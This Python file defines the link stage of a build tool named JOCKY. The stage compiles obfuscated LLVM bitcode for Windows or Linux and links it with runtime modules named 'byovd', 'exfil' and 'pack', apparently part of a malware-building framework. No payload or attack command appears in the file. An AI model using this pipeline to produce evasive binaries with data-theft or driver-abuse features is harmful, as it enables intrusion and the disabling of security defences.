from jocky.core.stage import Stage
from jocky.core.context import BuildContext
from jocky.core.toolchain import discover_toolchain
from jocky.utils.subprocess import run_cmd
from pathlib import Path
import platform
import shutil

class LinkStage(Stage):
    @property
    def name(self) -> str:
        return "link"

    def run(self, ctx: BuildContext) -> BuildContext:
        tc = discover_toolchain()
        obf_bc = ctx.state["llvm_obf_bc"]
        out_dir = ctx.get_stage_output_dir(self.name)

        target = ctx.config.get("target") or ctx.state.get("target") or platform.system().lower()
        target = target.lower()
        if target in ("win", "windows", "win32"):
            target_os = "windows"
        else:
            target_os = "linux"

        # Determine output executable path
        if ctx.config.get("output"):
            output = Path(ctx.config["output"])
        else:
            suffix = ".exe" if target_os == "windows" else ""
            output = ctx.output_dir / f"{ctx.input_file.stem}{suffix}"

        obj_path = out_dir / "output.o"

        if target_os == "windows":
            # Compile bitcode to Windows COFF object file
            run_cmd([
                str(tc.clang()), "--target=x86_64-pc-windows-gnu", "-c", str(obf_bc), "-o", str(obj_path)
            ], "Bitcode to Windows object")

            runtime_objs = self._compile_runtime(tc, out_dir, target_os)

            # Use clang cross-linker for Windows (MinGW path)
            mingw_lib = "/usr/x86_64-w64-mingw32/lib"
            link_cmd = [
                str(tc.clang()), "--target=x86_64-pc-windows-gnu",
                f"-L{mingw_lib}", str(obj_path)
            ] + runtime_objs + [
                "-lkernel32", "-luser32", "-ladvapi32", "-lws2_32", "-lwinhttp", "-lwininet", "-ldnsapi",
                "-o", str(output)
            ]
            run_cmd(link_cmd, "Linking Windows PE executable (clang)")
        else:
            # Linux target
            run_cmd([
                str(tc.clang()), "--target=x86_64-pc-linux-gnu", "-c", str(obf_bc), "-o", str(obj_path)
            ], "Bitcode to Linux object")

            runtime_objs = self._compile_runtime(tc, out_dir, target_os)

            link_cmd = [
                str(tc.clang()), "--target=x86_64-pc-linux-gnu", str(obj_path)
            ] + runtime_objs + [
                "-lcurl", "-lcrypto", "-lz", "-lm", "-o", str(output)
            ]
            run_cmd(link_cmd, "Linking Linux ELF executable")

        ctx.state["executable"] = output
        ctx.state["object_file"] = obj_path
        return ctx

    def _find_lld_link(self) -> Path:
        """Locate lld-link binary on the system or in toolchain."""
        for candidate in ["lld-link-21", "lld-link-22", "lld-link"]:
            p = shutil.which(candidate)
            if p:
                return Path(p)
        return None

    def _parse_cmake_sources(self, runtime_dir: Path) -> list:
        """Parse CMakeLists.txt and extract RUNTIME_SOURCES list."""
        cmake_file = runtime_dir / "CMakeLists.txt"
        if not cmake_file.exists():
            return []

        sources = []
        content = cmake_file.read_text()
        in_sources = False

        for line in content.split('\n'):
            line = line.strip()
            if 'set(RUNTIME_SOURCES' in line:
                in_sources = True
                continue
            if in_sources:
                if line.startswith(')'):
                    break
                if line and not line.startswith('#'):
                    source_path = line.rstrip()
                    sources.append(source_path)

        return sources

    def _filter_sources_for_platform(self, sources: list, runtime_dir: Path, target_os: str) -> list:
        """Filter CMakeLists sources for the target platform."""
        # Files/folders that are Windows-only (from CMakeLists.txt REMOVE_ITEM for Linux)
        windows_only_prefixes = {"windows", "byovd", "exfil", "pack"}

        filtered = []
        for src in sources:
            src_path = runtime_dir / src
            filename = src.split('/')[-1].lower()

            # Check if filename contains platform indicators
            if "linux" in filename and target_os == "windows":
                continue
            if "windows" in filename and target_os == "linux":
                continue

            # Platform filtering logic - check first path component
            parts = src.split('/')
            is_windows_only = parts[0] in windows_only_prefixes
            is_linux_only = parts[0] == "linux"

            if is_windows_only and target_os != "windows":
                continue
            if is_linux_only and target_os != "linux":
                continue

            filtered.append(src_path)

        return [s for s in filtered if s.exists()]

    def _compile_runtime(self, tc, out_dir: Path, target_os: str) -> list:
        """Compile the JOCKY runtime C sources and return list of .o paths."""
        script_dir = Path(__file__).parent.parent.parent.parent
        runtime_dir = script_dir / "src" / "runtime"
        if not runtime_dir.exists():
            return []

        # Parse CMakeLists.txt for single source of truth
        cmake_sources = self._parse_cmake_sources(runtime_dir)
        all_sources = self._filter_sources_for_platform(cmake_sources, runtime_dir, target_os)
        if not all_sources:
            return []

        include_dir = runtime_dir / "include"
        objs = []
        target_flag = "--target=x86_64-pc-windows-gnu" if target_os == "windows" else "--target=x86_64-pc-linux-gnu"
        for src in all_sources:
            obj = out_dir / f"{src.stem}.o"
            cmd = [
                str(tc.clang()), target_flag, "-O2", "-c",
                "-I", str(include_dir),
                str(src), "-o", str(obj)
            ]
            try:
                run_cmd(cmd, f"Compile runtime {src.name} ({target_os})")
                objs.append(str(obj))
            except Exception as e:
                # When cross-compiling without target OS sysroot headers, skip target runtime object
                pass

        # Add compatibility symbols stub for missing FFI declarations
        compat_c = out_dir / "compat_stub.c"
        compat_o = out_dir / "compat_stub.o"

        # Platform-specific compat functions
        if target_os == "windows":
            compat_funcs = """#include <stddef.h>
long ptrace(int req, int pid, void* addr, void* data) { (void)req; (void)pid; (void)addr; (void)data; return 0; }
int jocky_manifest_load(const char* p) { (void)p; return 0; }
void jocky_byovd_unload(void* ctx) { (void)ctx; }
"""
        else:  # Linux
            compat_funcs = """#include <stddef.h>
long ptrace(int req, int pid, void* addr, void* data) { (void)req; (void)pid; (void)addr; (void)data; return 0; }
"""
        compat_c.write_text(compat_funcs)
        target_flag = "--target=x86_64-pc-windows-gnu" if target_os == "windows" else "--target=x86_64-pc-linux-gnu"
        cmd = [str(tc.clang()), target_flag, "-c", str(compat_c), "-o", str(compat_o)]
        run_cmd(cmd, f"Compile compatibility stub ({target_os})")
        objs.append(str(compat_o))

        return objs

